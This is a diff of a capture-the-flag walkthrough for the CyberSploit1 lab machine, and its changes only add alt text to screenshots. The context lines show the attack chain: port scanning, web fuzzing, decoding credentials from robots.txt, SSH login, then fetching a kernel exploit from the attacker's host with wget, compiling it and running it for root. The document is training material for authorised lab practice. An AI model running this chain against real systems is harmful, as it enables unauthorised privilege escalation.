@@ -33,17 +33,17 @@ nmap -A -p- TARGET -oN cybersploit1 --min-rate 10000
 | 22       | ssh         |
 | 80       | http        |
 
-![](https://cdn.ziomsec.com/cybersploit1/1.webp)
+![performing an nmap scan on cybersploit1](https://cdn.ziomsec.com/cybersploit1/1.webp)
 
 ## Foothold
 
 Since the target was running a web application, I accessed it using my browser and found a static webpage.
 
-![](https://cdn.ziomsec.com/cybersploit1/2.webp)
+![accessing the web application](https://cdn.ziomsec.com/cybersploit1/2.webp)
 
 The page did not reveal anything useful initially so I viewed the page source and found a username commented out towards the end of the **html** document.
 
-![](https://cdn.ziomsec.com/cybersploit1/3.webp)
+![viewing the source code](https://cdn.ziomsec.com/cybersploit1/3.webp)
 
 Next I performed web fuzzing using **ffuf** and discovered the **robots.txt** file.
 
@@ -51,7 +51,7 @@ Next I performed web fuzzing using **ffuf** and discovered the **robots.txt** fi
 ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/4.webp)
+![performing fuzz attack on the web application](https://cdn.ziomsec.com/cybersploit1/4.webp)
 
 Accessing **`/robots.txt`** revealed a base64 encoded string. So I decoded it using the **base64** command line utility.
 
@@ -59,7 +59,7 @@ Accessing **`/robots.txt`** revealed a base64 encoded string. So I decoded it us
 curl http://TARGET/robots.txt | base64 -d
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/5.webp)
+![accessing the robots.txt file](https://cdn.ziomsec.com/cybersploit1/5.webp)
 
 This seemed interesting but initially I had no idea what this meant. I did some more reconnaissance on the website and found nothing useful.
 
@@ -70,7 +70,7 @@ ssh itsskv@TARGET
 # PASSWORD
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/6.webp)
+![logging in via ssh](https://cdn.ziomsec.com/cybersploit1/6.webp)
 
 After getting initial access, I listed out the contents of my current directory and found the first flag in **local.txt**.
 
@@ -78,7 +78,7 @@ After getting initial access, I listed out the contents of my current directory 
 cat local.txt
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/7.webp)
+![capturing the user flag](https://cdn.ziomsec.com/cybersploit1/7.webp)
 
 ## Privilege Escalation
 
@@ -89,13 +89,13 @@ For privilege escalation, I downloaded **linux smart enumeration** script from g
  $ chmod +x lse.sh
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/8.webp)
+![downloading linux smart enumeration script](https://cdn.ziomsec.com/cybersploit1/8.webp)
 
 I executed the script and found some interesting results.
 
-![](https://cdn.ziomsec.com/cybersploit1/9.webp)
-![](https://cdn.ziomsec.com/cybersploit1/10.webp)
-![](https://cdn.ziomsec.com/cybersploit1/11.webp)
+![running the lse script](https://cdn.ziomsec.com/cybersploit1/9.webp)
+![running the lse script](https://cdn.ziomsec.com/cybersploit1/10.webp)
+![running the lse script](https://cdn.ziomsec.com/cybersploit1/11.webp)
 
 The script identified a couple of misconfigurations which I looked into but found nothing interesting. I then tried looking for kernel exploits. I viewed my kernel version using the following command:
 
@@ -105,9 +105,9 @@ uname -r
 
 I googled available exploits for the version and found some on **exploit db**.
 
-![](https://cdn.ziomsec.com/cybersploit1/12.webp)
+![finding kernel exploits](https://cdn.ziomsec.com/cybersploit1/12.webp)
 
-![](https://cdn.ziomsec.com/cybersploit1/13.webp)
+![finding kernel exploit](https://cdn.ziomsec.com/cybersploit1/13.webp)
 
 I downloaded the exploit on my system and started a python http server to transfer it on the target.
 
@@ -115,7 +115,7 @@ I downloaded the exploit on my system and started a python http server to transf
 python3 -m http.server 8080
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/14.webp)
+![running an http server](https://cdn.ziomsec.com/cybersploit1/14.webp)
 
 I downloaded the exploit from my local machine and compiled it using **gcc**.
 
@@ -124,7 +124,7 @@ $ wget "http://KALI:8080/37292.c"
 $ gcc 37292.c -o priv
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/15.webp)
+![downloading the exploit on the target](https://cdn.ziomsec.com/cybersploit1/15.webp)
 
 Finally I ran the exploit and got root shell.
 
@@ -133,7 +133,7 @@ $ chmod +x priv
 $ ./priv
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/16.webp)
+![compiling the exploit and executing it](https://cdn.ziomsec.com/cybersploit1/16.webp)
 
 I spawned a pty shell and then navigated to the `/root` directory to capture the final flag.
 
@@ -143,7 +143,7 @@ $ python -c 'import pty;pty.spawn("/bin/bash")'
 $ cat proof.txt
 ```
 
-![](https://cdn.ziomsec.com/cybersploit1/17.webp)
+![capturing the root flag](https://cdn.ziomsec.com/cybersploit1/17.webp)
 
 ## Closure
 
